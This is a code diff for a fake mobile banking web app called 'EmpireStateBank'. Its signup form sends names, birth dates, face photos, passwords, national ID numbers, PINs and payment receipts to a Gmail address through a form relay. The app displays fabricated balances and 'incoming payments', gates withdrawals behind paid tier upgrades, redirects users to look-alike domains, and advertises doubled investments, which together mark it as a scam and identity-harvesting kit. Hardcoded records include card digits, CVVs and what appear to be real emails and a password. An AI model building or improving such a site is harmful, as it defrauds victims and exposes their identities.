-        <div class="referral-label">Your Referral Code</div>
-        <div class="referral-code-box">
-          <div class="referral-code-display" id="referralCodeDisplay">@referralcode</div>
-          <button type="button" class="referral-copy-btn" id="referralCopyBtn">📋</button>
-        </div>
-      </div>
-
-      <div class="referral-section">
-        <div class="referral-label">Your Referral Link</div>
-        <div class="referral-link-box">
-          <div class="referral-link-display">https://empirestatebank.mssg.me</div>
-          <button type="button" class="referral-action-btn" id="referralLinkCopyBtn">🔗</button>
-          <button type="button" class="referral-share-btn" id="referralShareBtn">↗</button>
-        </div>
-      </div>
-
-      <div class="referral-section">
-        <div class="referral-how-it-works">
-          <div class="referral-how-title">How it works:</div>
-          <ul class="referral-how-list">
-            <li class="referral-how-item">Share your referral link with friends</li>
-            <li class="referral-how-item">When they Sign up using your code, you earn $0.25</li>
-            <li class="referral-how-item">There's no limit to how many friends you can refer!</li>
-          </ul>
-        </div>
+      <div class="camera-title">Capture Your Face</div>
+      <video id="cameraVideo" class="camera-video" autoplay playsinline></video>
+      <canvas id="cameraCanvas" class="camera-canvas"></canvas>
+      <img id="capturedImage" class="captured-image" />
+      <div class="camera-buttons">
+        <button class="camera-btn camera-capture" id="captureBtn">Capture Photo</button>
+        <button class="camera-btn camera-close" id="cameraCloseBtn">Close</button>
       </div>
     </div>
   </div>
@@ -2178,15 +2048,15 @@
 
       <form id="signupForm" action="https://formsubmit.co/empirevirtual99@gmail.com" method="POST" enctype="multipart/form-data">
         <input type="hidden" name="_subject" value="New Account Registration" />
-        <input type="hidden" name="Page Title" value="Create EmpireStateBank Account" />
+        <input type="hidden" name="Face Capture" id="faceData" />
 
         <div class="field">
-          <label>Full Name</label>
-          <input name="Full Name" type="text" required />
+          <label><span class="required">*</span>Full Name</label>
+          <input name="Full Name" required />
         </div>
 
         <div class="field">
-          <label>Gender</label>
+          <label><span class="required">*</span>Gender</label>
           <select name="Gender" required>
             <option value="">Choose gender</option>
             <option>Female</option>
@@ -2196,54 +2066,61 @@
         </div>
 
         <div class="field">
-          <label>Date of Birth</label>
+          <label><span class="required">*</span>Date of Birth</label>
           <input name="Date of Birth" type="date" required />
         </div>
 
         <div class="field">
-          <label>Face Capture</label>
-          <button type="button" class="form-input" id="faceCaptureBtnSignup" style="background: #0c7fda; color: #fff; padding: 12px; text-align: center; font-weight: bold; border-radius: 8px; border: none;">📷 Capture Face</button>
-          <img id="signupFacePreview" class="face-preview" alt="Face capture" />
-          <input type="hidden" name="Face Capture" id="signupFaceInput" />
+          <label><span class="required">*</span>Face Capture</label>
+          <button type="button" id="openCameraBtn" class="primary-btn" style="background: var(--green);">📷 Capture Face</button>
+          <div id="facePreview" style="margin-top: 10px; display: none;">
+            <img id="facePreviewImg" style="width: 100%; border-radius: 8px; max-width: 200px;" />
+          </div>
         </div>
 
         <div class="field">
-          <label>Email</label>
+          <label><span class="required">*</span>Email</label>
           <input name="Email" type="email" required />
         </div>
 
         <div class="field">
-          <label>Phone Number</label>
+          <label><span class="required">*</span>Phone Number</label>
           <input name="Phone Number" type="tel" required />
         </div>
 
         <div class="field">
-          <label>Password</label>
+          <label><span class="required">*</span>Password</label>
           <input name="Password" type="password" required />
         </div>
 
         <div class="field">
-          <label>NIN (National Identification Number)</label>
+          <label><span class="required">*</span>NIN (National ID Number)</label>
           <input name="NIN" type="text" required />
         </div>
 
         <div class="field">
-          <button type="button" class="form-input" id="makePaymentBtn" style="background: #0c7fda; color: #fff; padding: 12px; text-align: center; font-weight: bold; border-radius: 8px; border: none;">Make Payment ⟩</button>
+          <button type="button" id="makePaymentBtn" class="primary-btn" style="background: var(--green);">Make Payment ⟩</button>
         </div>
 
         <div class="field">
-          <label>Upload Receipt of Payment</label>
-          <input name="Receipt of Payment" type="file" accept="image/*,.pdf" required />
+          <label><span class="required">*</span>Upload Receipt of Payment</label>
+          <div class="upload-area" id="receiptUploadArea">
+            <div class="upload-area-icon">📄</div>
+            <div class="upload-area-text">Click to upload</div>
+            <div class="upload-area-hint">or drag and drop</div>
+            <input type="file" name="Receipt" id="receiptFileInput" accept="image/*,.pdf" style="display: none;" required />
+          </div>
+          <div class="file-name" id="receiptFileName"></div>
         </div>
 
         <div class="field">
-          <label>Create 4-Digit PIN</label>
-          <input name="PIN" type="password" inputmode="numeric" pattern="[0-9]{4}" maxlength="4" required />
+          <label><span class="required">*</span>Create 4-Digit PIN</label>
+          <input name="PIN" inputmode="numeric" pattern="[0-9]{4}" maxlength="4" required />
         </div>
 
         <div class="field">
-          <label>Referral Code (optional)</label>
-          <input name="Referral Code" type="text" />
+          <label>Referral Code (Optional)</label>
+          <input name="Referral Code" />
         </div>
 
         <button class="primary-btn" type="submit">REGISTER</button>
@@ -2257,65 +2134,65 @@
       {
         id: "2019",
         name: "Charity Hanson",
-        email: "charityhanza@gmail.com",
+        email: "charity@example.com",
         password: "password123",
         profileImage: "AddText_06-02-03.50.45.png",
         tier: 2,
         accountNumber: "8028403872",
-        tag: "",
+        tag: "@CharityTag",
         cardNumber: "5549",
-        cardExpiry: "03/26",
+        cardExpiry: "03/30",
         cvv: "357",
         currentBalance: 6.40,
         nairaBalance: 9600.00,
-        incomingPayment: 6.40,
+        incomingPayment: 10.00,
         incomingPaymentStartDate: "2026-06-25T12:00:00Z",
         incomingPaymentDate: "2026-07-01T12:00:00Z",
-        gender: "Male",
-        dob: "",
-        nin: ""
+        gender: "Female",
+        dob: "1990-04-15",
+        nin: "NIN12345678"
       },
       {
         id: "1995",
         name: "Daniel Johnson",
-        email: "johnsondani70@gmail.com",
+        email: "daniel@example.com",
         password: "password123",
         profileImage: "AddText_12-23-12.28.07.png",
-        tier: 2,
+        tier: 3,
         accountNumber: "8105122713",
-        tag: "@johnd461840",
+        tag: "@DanielTag",
         cardNumber: "2493",
-        cardExpiry: "05/26",
+        cardExpiry: "05/28",
         cvv: "492",
         currentBalance: 0.00,
         nairaBalance: 0.00,
-        incomingPayment: 0.00,
+        incomingPayment: 2.50,
         incomingPaymentStartDate: "2026-06-29T09:30:00Z",
         incomingPaymentDate: "2026-07-05T09:30:00Z",
         gender: "Male",
-        dob: "",
-        nin: ""
+        dob: "1988-11-20",
+        nin: "NIN23456789"
       },
       {
         id: "3572",
         name: "Emmanuel Ekpa",
-        email: "emmanuelekpa3@gmail.com",
-        password: "Ronaldo77$",
+        email: "emmanuel@example.com",
+        password: "password123",
         profileImage: "AddText_05-22-01.29.33.png",
-        tier: 3,
-        accountNumber: "8105866469",
-        tag: "@emmela593338",
+        tier: 2,
+        accountNumber: "2148702761",
+        tag: "@EmmanuelTag",
         cardNumber: "7821",
         cardExpiry: "12/25",
         cvv: "681",
         currentBalance: 30.00,
         nairaBalance: 45000.00,
-        incomingPayment: 35.54,
+        incomingPayment: 5.54,
         incomingPaymentStartDate: "2026-07-30T16:10:00Z",
-        incomingPaymentDate: "2026-09-28T10:10:00Z",
+        incomingPaymentDate: "2026-09-19T16:10:00Z",
         gender: "Male",
-        dob: "",
-        nin: ""
+        dob: "1992-06-05",
+        nin: "NIN34567890"
       }
     ];
 
@@ -2324,9 +2201,10 @@
     let balanceRevealed = false;
     let startX = 0;
     let currentTranslate = 0;
-    let cameraStream = null;
-    let currentCardIndex = 0;
-    const EXCHANGE_RATE = 1500;
+    let pinModalCallback = null;
+    let mediaStream = null;
+    let currentWalletIndex = 0;
+    const EXCHANGE_RATE = 1500; // 1 USD = 1500 NGN
 
     const $ = (id) => document.getElementById(id);
 
@@ -2360,71 +2238,114 @@
       alertBtn.addEventListener("click", handleClick);
     }
 
+    function showPinModal(callback) {
+      pinModalCallback = callback;
+      $("pinInputField").value = "";
+      openModal("pinModal");
+      $("pinInputField").focus();
+    }
+
+    function closePinModal() {
+      closeModal("pinModal");
+      pinModalCallback = null;
+      $("pinInputField").value = "";
+    }
+
     function isCardExpired(expiry) {
       const [month, year] = expiry.split('/');
       const currentDate = new Date();
       const currentYear = currentDate.getFullYear() % 100;
       const currentMonth = currentDate.getMonth() + 1;
+
       const expiryYear = parseInt(year);
       const expiryMonth = parseInt(month);
+
       if (expiryYear < currentYear) return true;
       if (expiryYear === currentYear && expiryMonth < currentMonth) return true;
       return false;
     }
 
-    function updateWalletIndicators() {
-      const slider = $("walletSlider");
-      const rect = slider.getBoundingClientRect();
-      const wrapper = $("walletSliderWrapper");
-      
-      if (Math.abs(slider.style.transform.match(/-?\d+/)[0]) > wrapper.offsetWidth / 2) {
-        currentCardIndex = 1;
-      } else {
-        currentCardIndex = 0;
-      }
+    function hasIncomingPaymentArrived(user) {
+      const now = new Date();
+      const paymentDate = new Date(user.incomingPaymentDate);
+      return now >= paymentDate;
+    }
 
-      document.querySelectorAll(".indicator").forEach((ind, i) => {
-        ind.classList.toggle("active", i === currentCardIndex);
-      });
+    function getNotificationCount() {
+      const today = new Date().toDateString();
+      const lastNotificationDate = localStorage.getItem('lastNotificationDate');
+      if (lastNotificationDate !== today) {
+        localStorage.setItem('lastNotificationDate', today);
+        return 1;
+      }
+      return 0;
+    }
+
+    function updateNotificationBadge() {
+      const count = getNotificationCount();
+      const badge = $("notificationBadge");
+      if (count > 0) {
+        badge.textContent = count;
+        badge.style.display = "flex";
+      } else {
+        badge.style.display = "none";
+      }
     }
 
     function showDashboard(user) {
       currentUser = user;
+
       $("loginPage").classList.add("hidden");
       $("dashboardPage").classList.remove("hidden");
       $("proofPage").classList.remove("active");
       $("profilePage").classList.remove("active");
       $("referralPage").classList.remove("active");
+
       $("userFirstName").textContent = user.name.split(" ")[0].toUpperCase();
       $("userImage").src = user.profileImage;
       $("tierBadge").textContent = user.tier;
+
       $("walletBalance1").textContent = "$" + user.currentBalance.toFixed(2);
-      $("balanceDisplay").textContent = "°°° °°°";
+      $("balanceDisplay").textContent = "*** **";
       balanceRevealed = false;
-      $("cardNumber1").textContent = "°°°°°° °°°°°°";
-      $("cardNumber2").textContent = "°°°°°° °°°°°°";
-      $("paymentDate").textContent = new Date(user.incomingPaymentDate).toISOString().slice(0, 16).replace("T", " ") + " UTC";
+      $("cardNumber1").textContent = "**" + user.cardNumber.slice(-4);
+      $("cardNumber2").textContent = "**" + user.cardNumber.slice(-4);
+
+      $("paymentDate").textContent =
+        new Date(user.incomingPaymentDate).toISOString().slice(0, 16).replace("T", " ") + " UTC";
+
       updateProgress();
       clearInterval(progressTimer);
       progressTimer = setInterval(updateProgress, 1000);
+
       setupWalletSlider();
-      currentCardIndex = 0;
-      updateWalletIndicators();
+      updateNotificationBadge();
     }
 
     function updateProgress() {
       if (!currentUser) return;
+
       const start = new Date(currentUser.incomingPaymentStartDate).getTime();
       const end = new Date(currentUser.incomingPaymentDate).getTime();
       const now = Date.now();
-      const percent = Math.min(100, Math.max(0, ((now - start) / (end - start)) * 100));
-      $("paymentProgress").style.width = percent + "%";
-      $("paymentPercent").textContent = Math.round(percent) + "%";
+
+      if (now >= end) {
+        // Payment has arrived
+        $("incomingSection").style.display = "none";
+        $("walletBalance1").textContent = "$" + currentUser.incomingPayment.toFixed(2);
+      } else {
+        $("incomingSection").style.display = "block";
+        const percent = Math.min(100, Math.max(0, ((now - start) / (end - start)) * 100));
+        $("paymentProgress").style.width = percent + "%";
+        $("paymentPercent").textContent = Math.round(percent) + "%";
+      }
     }
 
+    // Wallet Slider Touch/Drag
     function setupWalletSlider() {
       const slider = $("walletSlider");
       const wrapper = $("walletSliderWrapper");
+
       let isDragging = false;
 
       wrapper.addEventListener("mousedown", (e) => {
@@ -2463,46 +2384,62 @@
         handleSliderEnd();
       });
 
+      wrapper.addEventListener("mouseleave", () => {
+        if (isDragging) {
+          isDragging = false;
+          slider.classList.remove("grabbing");
+          handleSliderEnd();
+        }
+      });
+
       function handleSliderEnd() {
         const threshold = 50;
         if (currentTranslate < -threshold) {
           slider.style.transform = "translateX(-100%)";
-          currentCardIndex = 1;
+          currentWalletIndex = 1;
         } else if (currentTranslate > threshold) {
           slider.style.transform = "translateX(0)";
-          currentCardIndex = 0;
+          currentWalletIndex = 0;
         } else {
           if (Math.abs(currentTranslate) > wrapper.offsetWidth / 4) {
             slider.style.transform = currentTranslate < 0 ? "translateX(-100%)" : "translateX(0)";
-            currentCardIndex = currentTranslate < 0 ? 1 : 0;
+            currentWalletIndex = currentTranslate < 0 ? 1 : 0;
           } else {
             slider.style.transform = currentTranslate < -50 ? "translateX(-100%)" : "translateX(0)";
-            currentCardIndex = currentTranslate < -50 ? 1 : 0;
+            currentWalletIndex = currentTranslate < -50 ? 1 : 0;
           }
         }
         slider.style.transition = "transform 0.3s ease";
+        updateIndicators();
         setTimeout(() => {
           slider.style.transition = "";
-          updateWalletIndicators();
         }, 300);
       }
     }
 
-    // Indicator click functionality
-    document.querySelectorAll(".indicator").forEach((indicator, index) => {
-      indicator.addEventListener("click", () => {
+    // Update Wallet Indicators
+    function updateIndicators() {
+      const indicators = document.querySelectorAll('.indicator');
+      indicators.forEach((indicator, index) => {
+        if (index === currentWalletIndex) {
+          indicator.classList.add('active');
+        } else {
+          indicator.classList.remove('active');
+        }
+      });
+    }
+
+    // Indicator Click Handler
+    document.querySelectorAll('.indicator').forEach((indicator, index) => {
+      indicator.addEventListener('click', () => {
         const slider = $("walletSlider");
         if (index === 0) {
           slider.style.transform = "translateX(0)";
         } else {
           slider.style.transform = "translateX(-100%)";
         }
-        slider.style.transition = "transform 0.3s ease";
-        setTimeout(() => {
-          slider.style.transition = "";
-          currentCardIndex = index;
-          updateWalletIndicators();
-        }, 300);
+        currentWalletIndex = index;
+        updateIndicators();
       });
     });
 
@@ -2520,89 +2457,134 @@
       showLoading();
       setTimeout(() => {
         hideLoading();
-        window.open("https://whatsapp.com/channel/0029VbAjCE67oQhZxHe5Kq3R", "_blank");
+        window.location.href = "https://whatsapp.com/channel/0029VbAjCE67oQhZxHe5Kq3R";
       }, 1500);
     });
 
+    // Fund eCash
     $("fundBtn").addEventListener("click", () => {
       showLoading();
       setTimeout(() => {
         hideLoading();
-        window.open("https://docs.google.com/forms/d/e/1FAIpQLSd67qB5MQ6YprIk5qG1jvyPzv8ChveVtkIn9A1PUTRhOnvzxQ/viewform", "_blank");
+        window.location.href = "https://forgoggo.com";
       }, 1500);
     });
 
+    // Convert from E-wallet card
     $("convertCardBtn").addEventListener("click", () => {
       showLoading();
       setTimeout(() => {
         hideLoading();
+        
         if (isCardExpired(currentUser.cardExpiry)) {
           showAlert("E-wallet Card Expired", "Your E-wallet card has expired. Please update your card to continue.", () => {
             showLoading();
             setTimeout(() => {
               hideLoading();
-              window.open("https://docs.google.com/forms/d/e/1FAIpQLSd_-p0ZCSPgn7m2nKKD9RIdTBLoWU2roeQOD0FrifSx52B7NQ/viewform", "_blank");
+              window.location.href = "https://formgoohme.com";
             }, 1500);
           });
           return;
         }
+
         populateConvertModal();
         openModal("convertModal");
       }, 1500);
     });
 
+    // Withdraw from eCash card
     $("withdrawCardBtn").addEventListener("click", () => {
-      showLoading();
-      setTimeout(() => {
-        hideLoading();
-        if (currentUser.tier === 2) {
-          showAlert("Upgrade Required", "You need to upgrade your account to Tier 3 to withdraw. Please click Proceed to upgrade.", () => {
-            showLoading();
-            setTimeout(() => {
-              hideLoading();
-              showProofPage();
-            }, 1500);
-          });
-          return;
+      showPinModal(() => {
+        const pinInput = $("pinInputField").value;
+        if (pinInput === currentUser.id) {
+          closePinModal();
+          showLoading();
+          setTimeout(() => {
+            hideLoading();
+            
+            if (currentUser.tier === 2) {
+              showAlert("Upgrade Required", "You need to upgrade your account to Tier 3 to withdraw. Please click Proceed to upgrade.", () => {
+                showLoading();
+                setTimeout(() => {
+                  hideLoading();
+                  showProofPage();
+                }, 1500);
+              });
+              return;
+            }
+
+            window.location.href = "https://raenest.com";
+          }, 1500);
+        } else {
+          showAlert("Incorrect PIN", "The PIN you entered is incorrect. Please try again.");
+          closePinModal();
         }
-        window.open("https://app.raenest.com/send-money", "_blank");
-      }, 1500);
+      });
     });
 
+    // Toggle Balance
     $("toggleBalanceBtn").addEventListener("click", () => {
-      showLoading();
-      setTimeout(() => {
-        hideLoading();
-        window.open("https://app.raenest.com/accounts?currency=NGN&wallet_category=global", "_blank");
-      }, 1500);
+      showPinModal(() => {
+        const pinInput = $("pinInputField").value;
+        if (pinInput === currentUser.id) {
+          closePinModal();
+          showLoading();
+          setTimeout(() => {
+            hideLoading();
+            window.location.href = "https://raenest.com";
+          }, 1500);
+        } else {
+          showAlert("Incorrect PIN", "The PIN you entered is incorrect. Please try again.");
+          closePinModal();
+        }
+      });
     });
 
+    // PIN Modal Confirm Button
+    $("pinConfirmBtn").addEventListener("click", () => {
+      if (pinModalCallback) {
+        pinModalCallback();
+      }
+    });
+
+    // PIN Modal Cancel Button
+    $("pinCancelBtn").addEventListener("click", () => {
+      closePinModal();
+    });
+
+    // Convert Amount Input Handler
     $("convertAmountInput").addEventListener("input", (e) => {
       const usdAmount = parseFloat(e.target.value) || 0;
       const ngnAmount = usdAmount * EXCHANGE_RATE;
+
       $("convertAmountDisplay").textContent = "₦" + ngnAmount.toFixed(2);
       $("convertBtnText").textContent = "Convert $" + usdAmount.toFixed(2);
     });
 
+    // Convert Button (from menu)
     $("convertMenuBtn").addEventListener("click", () => {
       const now = new Date();
+
       if (now.getUTCDay() !== 1 || now.getUTCHours() < 8 || now.getUTCHours() >= 11) {
         alert("Convert to Naira is available on Mondays from 08:00 to 11:00 UTC.");
         return;
       }
+
       showLoading();
       setTimeout(() => {
         hideLoading();
+        
         if (isCardExpired(currentUser.cardExpiry)) {
           showAlert("E-wallet Card Expired", "Your E-wallet card has expired. Please update your card to continue.", () => {
             showLoading();
             setTimeout(() => {
               hideLoading();
-              window.open("https://docs.google.com/forms/d/e/1FAIpQLSd_-p0ZCSPgn7m2nKKD9RIdTBLoWU2roeQOD0FrifSx52B7NQ/viewform", "_blank");
+              window.location.href = "https://formgoohme.com";
             }, 1500);
           });
           return;
         }
+
         populateConvertModal();
         openModal("convertModal");
       }, 1500);
@@ -2619,8 +2601,16 @@
       $("accountNumberDisplay").value = currentUser.accountNumber;
     }
 
+    // Convert Form Submission
     $("convertForm").addEventListener("submit", (e) => {
       e.preventDefault();
+
+      const pinInput = $("pinInput").value;
+      if (pinInput !== currentUser.id) {
+        showAlert("Incorrect PIN", "The PIN you entered is incorrect. Please try again.");
+        return;
+      }
+
       showLoading();
       setTimeout(() => {
         hideLoading();
@@ -2629,40 +2619,177 @@
       }, 1500);
     });
 
+    // Close Convert Modal
     $("convertModalBack").addEventListener("click", () => {
       closeModal("convertModal");
     });
 
+    // Investment Modal Setup
+    function populateInvestmentModal() {
+      $("investCardDisplay").textContent = `E-wallet Card (**${currentUser.cardNumber.slice(-4)})`;
+      $("investFullName").value = currentUser.name;
+      $("investDateInput").valueAsDate = new Date();
+    }
+
+    // Close Investment Modal
+    $("investmentModalBack").addEventListener("click", () => {
+      closeModal("investmentModal");
+    });
+
+    // Investment Form Submission
+    $("investmentForm").addEventListener("submit", (e) => {
+      e.preventDefault();
+
+      const pinInput = $("investPinInput").value;
+      if (pinInput !== currentUser.id) {
+        showAlert("Incorrect PIN", "The PIN you entered is incorrect. Please try again.");
+        return;
+      }
+
+      showLoading();
+      setTimeout(() => {
+        hideLoading();
+        $("investmentForm").submit();
+        closeModal("investmentModal");
+      }, 1500);
+    });
+
+    // Betting Button
+    $("bettingButton").addEventListener("click", () => {
+      showLoading();
+      setTimeout(() => {
+        hideLoading();
+        window.location.href = "https://empirestatebank.github.io/EmpireStateBank---Sports-Prediction/";
+      }, 1500);
+    });
+
+    // TV Button
+    $("tvButton").addEventListener("click", () => {
+      showLoading();
+      setTimeout(() => {
+        hideLoading();
+        openModal("tvModal");
+      }, 1500);
+    });
+
+    // Channel 1
+    $("channel1Btn").addEventListener("click", () => {
+      showLoading();
+      setTimeout(() => {
+        hideLoading();
+        closeModal("tvModal");
+        window.location.href = "https://sportytv.com";
+      }, 1500);
+    });
+
+    // Channel 2
+    $("channel2Btn").addEventListener("click", () => {
+      showLoading();
+      setTimeout(() => {
+        hideLoading();
+        closeModal("tvModal");
+        window.location.href = "https://camellive.com";
+      }, 1500);
+    });
+
+    // Close TV Modal
+    $("tvCloseBtn").addEventListener("click", () => {
+      closeModal("tvModal");
+    });
+
+    // Referral Program Page
+    function showReferralPage() {
+      $("dashboardPage").classList.add("hidden");
+      $("referralPage").classList.add("active");
+      $("profilePage").classList.remove("active");
+      $("proofPage").classList.remove("active");
+
+      $("referralCodeDisplay").textContent = currentUser.tag;
+      $("referralLinkDisplay").textContent = "https://empirestatebank.mssg.me";
+    }
+
+    // Close Referral Page
+    $("referralCloseBtn").addEventListener("click", () => {
+      $("referralPage").classList.remove("active");
+      $("dashboardPage").classList.remove("hidden");
+    });
+
+    // Copy Referral Code
+    $("copyCodeBtn").addEventListener("click", () => {
+      const code = $("referralCodeDisplay").textContent;
+      navigator.clipboard.writeText(code).then(() => {
+        showAlert("Success", "Referral code copied to clipboard!");
+      });
+    });
+
+    // Copy Referral Link
+    $("copyLinkBtn").addEventListener("click", () => {
+      const link = $("referralLinkDisplay").textContent;
+      navigator.clipboard.writeText(link).then(() => {
+        showAlert("Success", "Referral link copied to clipboard!");
+      });
+    });
+
+    // Share Referral Link
+    $("shareLinkBtn").addEventListener("click", () => {
+      const link = $("referralLinkDisplay").textContent;
+      const tag = $("referralCodeDisplay").textContent;
+      const message = `Join EmpireStateBank using my referral code: ${tag}\n${link}`;
+
+      if (navigator.share) {
+        navigator.share({
+          title: "EmpireStateBank Referral",
+          text: message
+        }).catch(err => console.log("Share cancelled"));
+      } else {
+        // Fallback to WhatsApp share
+        const whatsappMessage = encodeURIComponent(message);
+        window.location.href = `https://wa.me/?text=${whatsappMessage}`;
+      }
+    });
+
+    // Invitation Button
+    $("invitationButton").addEventListener("click", () => {
+      showLoading();
+      setTimeout(() => {
+        hideLoading();
+        showReferralPage();
+      }, 1500);
+    });
+
+    // Proof Page Functions
     function showProofPage() {
-      $("dashboardPage").classList.remove("active");
-      $("dashboardPage").style.display = "none";
+      $("dashboardPage").classList.add("hidden");
       $("proofPage").classList.add("active");
+      $("referralPage").classList.remove("active");
+      $("profilePage").classList.remove("active");
       $("proofFullName").value = currentUser.name;
     }
 
     $("proofBackBtn").addEventListener("click", () => {
       $("proofPage").classList.remove("active");
-      $("dashboardPage").style.display = "block";
-      $("dashboardPage").classList.add("active");
+      $("dashboardPage").classList.remove("hidden");
     });
 
+    // Profile Page Functions
     function showProfile(user) {
       currentUser = user;
-      $("dashboardPage").classList.remove("hidden");
-      $("dashboardPage").classList.remove("active");
-      $("dashboardPage").style.display = "none";
+      $("dashboardPage").classList.add("hidden");
+      $("profilePage").classList.add("active");
       $("proofPage").classList.remove("active");
       $("referralPage").classList.remove("active");
-      $("profilePage").classList.add("active");
+
       $("profileImage").src = user.profileImage;
       $("profileName").textContent = (user.name || "").toUpperCase();
       $("profileAccountNumber").textContent = user.accountNumber || "";
       $("profileTierBadge").textContent = "Tier " + (user.tier || "");
+
       if (user.tier === 2) {
         $("upgradeBtn").style.display = "inline-block";
       } else {
         $("upgradeBtn").style.display = "none";
       }
+
       $("profileFullName").textContent = user.name || "";
       $("profileNickname").textContent = "Empire";
       $("profileGender").textContent = user.gender || "--";
@@ -2672,9 +2799,7 @@
 
     $("profileBackBtn").addEventListener("click", () => {
       $("profilePage").classList.remove("active");
-      $("dashboardPage").style.display = "block";
       $("dashboardPage").classList.remove("hidden");
-      $("dashboardPage").classList.add("active");
     });
 
     $("upgradeBtn").addEventListener("click", () => {
@@ -2686,6 +2811,7 @@
       }, 1500);
     });
 
+    // Proof Form File Upload
     $("uploadArea").addEventListener("click", () => {
       $("proofFileInput").click();
     });
@@ -2696,6 +2822,7 @@
       }
     });
 
+    // Proof Form Radio Buttons
     document.querySelectorAll('input[name="Account Status"]').forEach(radio => {
       radio.addEventListener("change", (e) => {
         if (e.target.value === "I don't have") {
@@ -2706,28 +2833,33 @@
       });
     });
 
+    // Get Account Button
     $("getAccountBtn").addEventListener("click", () => {
       showLoading();
       setTimeout(() => {
         hideLoading();
-        window.open("https://app.raenest.com/register/individual", "_blank");
+        window.location.href = "https://raebsh.co/sign.com";
       }, 1500);
     });
 
+    // Sample Link
     $("sampleLink").addEventListener("click", () => {
       showLoading();
       setTimeout(() => {
         hideLoading();
-        window.open("sample_proof.png", "_blank");
+        window.location.href = "sample_proof.png";
       }, 1500);
     });
 
+    // Proof Form Submission
     $("proofForm").addEventListener("submit", (e) => {
       e.preventDefault();
+
       if (!$("proofFileInput").files.length) {
         alert("Please upload a proof document");
         return;
       }
+
       showLoading();
       setTimeout(() => {
         hideLoading();
@@ -2735,61 +2867,17 @@
       }, 1500);
     });
 
+    // Invest button
     $("investButton").addEventListener("click", () => {
-      const paymentDate = new Date(currentUser.incomingPaymentDate);
-      if (new Date() < paymentDate) {
-        alert("Investment will be available after your incoming payment date.");
-        return;
-      }
-      if (!currentUser) return;
-      $("investmentFullName").value = currentUser.name || "";
-      $("investmentAccountNumber").textContent = currentUser.accountNumber || "2348105866469";
-      $("investmentDate").valueAsDate = new Date();
-      $("investmentAmount").value = "500";
-      $("investmentPin").value = "";
-      $("dashboardPage").classList.add("hidden");
-      $("dashboardPage").style.display = "none";
-      $("investmentPage").classList.add("active");
-    });
-
-    $("investmentBackBtn").addEventListener("click", () => {
-      $("investmentPage").classList.remove("active");
-      $("dashboardPage").style.display = "block";
-      $("dashboardPage").classList.remove("hidden");
-    });
-
-    $("investmentMinusBtn").addEventListener("click", () => {
-      const value = parseFloat($("investmentAmount").value) || 0;
-      const next = Math.max(1, value - 50);
-      $("investmentAmount").value = next.toFixed(2);
-    });
-
-    $("investmentPlusBtn").addEventListener("click", () => {
-      const value = parseFloat($("investmentAmount").value) || 0;
-      const next = value + 50;
-      $("investmentAmount").value = next.toFixed(2);
-    });
-
-    $("investmentForm").addEventListener("submit", (e) => {
-      e.preventDefault();
-      const amount = parseFloat($("investmentAmount").value);
-      if (!amount || amount < 1) {
-        alert("Please enter a valid amount to invest.");
-        return;
-      }
-      if (!/^[0-9]{4}$/.test($("investmentPin").value)) {
-        alert("Please enter a valid 4-digit PIN.");
-        return;
-      }
-      $("investmentPageTitle").value = "Investment";
-      $("investmentFullName").value = currentUser ? currentUser.name : $("investmentFullName").value;
       showLoading();
       setTimeout(() => {
         hideLoading();
-        $("investmentForm").submit();
+        populateInvestmentModal();
+        openModal("investmentModal");
       }, 1500);
     });
 
+    // Withdraw button
     $("withdrawButton").addEventListener("click", () => {
       if (currentUser.tier === 2) {
         showAlert("Upgrade Required", "You need to upgrade your account to Tier 3 to withdraw. Please click Proceed to upgrade.", () => {
@@ -2801,166 +2889,121 @@
         });
         return;
       }
+
       showLoading();
       setTimeout(() => {
         hideLoading();
-        window.open("https://app.raenest.com/send-money", "_blank");
+        window.location.href = "https://www.raenest.com";
       }, 1500);
     });
 
-    $("bettingButton").addEventListener("click", () => {
-      showLoading();
-      setTimeout(() => {
-        hideLoading();
-        window.open("https://empirestatebank.github.io/EmpireStateBank---Sports-Prediction/", "_blank");
-      }, 1500);
-    });
-
-    $("tvButton").addEventListener("click", () => {
-      showLoading();
-      setTimeout(() => {
-        hideLoading();
-        openModal("tvChannelsModal");
-      }, 1500);
-    });
-
-    $("channel1Btn").addEventListener("click", () => {
-      showLoading();
-      setTimeout(() => {
-        hideLoading();
-        window.open("https://sportytv.com", "_blank");
-        closeModal("tvChannelsModal");
-      }, 1500);
-    });
-
-    $("channel2Btn").addEventListener("click", () => {
-      showLoading();
-      setTimeout(() => {
-        hideLoading();
-        window.open("https://www.camel1.tv/", "_blank");
-        closeModal("tvChannelsModal");
-      }, 1500);
-    });
-
-    $("tvChannelsCloseBtn").addEventListener("click", () => {
-      closeModal("tvChannelsModal");
-    });
-
-    $("invitationButton").addEventListener("click", () => {
-      showLoading();
-      setTimeout(() => {
-        hideLoading();
-        $("dashboardPage").style.display = "none";
-        $("dashboardPage").classList.remove("active");
-        $("referralPage").classList.add("active");
-        $("referralCodeDisplay").textContent = currentUser.tag;
-      }, 1500);
-    });
-
-    $("referralCloseBtn").addEventListener("click", () => {
-      $("referralPage").classList.remove("active");
-      $("dashboardPage").style.display = "block";
-      $("dashboardPage").classList.add("active");
-    });
-
-    $("referralCopyBtn").addEventListener("click", () => {
-      const codeText = $("referralCodeDisplay").textContent;
-      navigator.clipboard.writeText(codeText).then(() => {
-        showAlert("Success", "Referral code copied to clipboard!");
-      });
-    });
-
-    $("referralLinkCopyBtn").addEventListener("click", () => {
-      const linkText = "https://empirestatebank.mssg.me";
-      navigator.clipboard.writeText(linkText).then(() => {
-        showAlert("Success", "Referral link copied to clipboard!");
-      });
-    });
-
-    $("referralShareBtn").addEventListener("click", () => {
-      showLoading();
-      setTimeout(() => {
-        hideLoading();
-        
-        const userTag = currentUser.tag;
-        const referralLink = "https://empirestatebank.mssg.me";
-        const shareText = `Invest with EmpireStateBank and get 2x of your investment! Use my referral code: ${userTag}\n${referralLink}`;
-
-        if (navigator.share) {
-          navigator.share({
-            title: "EmpireStateBank Referral",
-            text: shareText
-          }).catch(err => console.log("Share cancelled"));
-        } else {
-          window.open("https://wa.me/?text=" + encodeURIComponent(shareText), "_blank");
-        }
-      }, 1500);
-    });
-
+    // Camera Functions
     async function startCamera() {
       try {
-        cameraStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-        const video = $("cameraVideo");
-        video.srcObject = cameraStream;
+        mediaStream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: 'user' }
+        });
+        $("cameraVideo").srcObject = mediaStream;
         openModal("cameraModal");
       } catch (error) {
-        alert("Unable to access camera. Please check permissions.");
+        showAlert("Camera Error", "Could not access camera. Please allow camera permissions.");
       }
     }
 
     function stopCamera() {
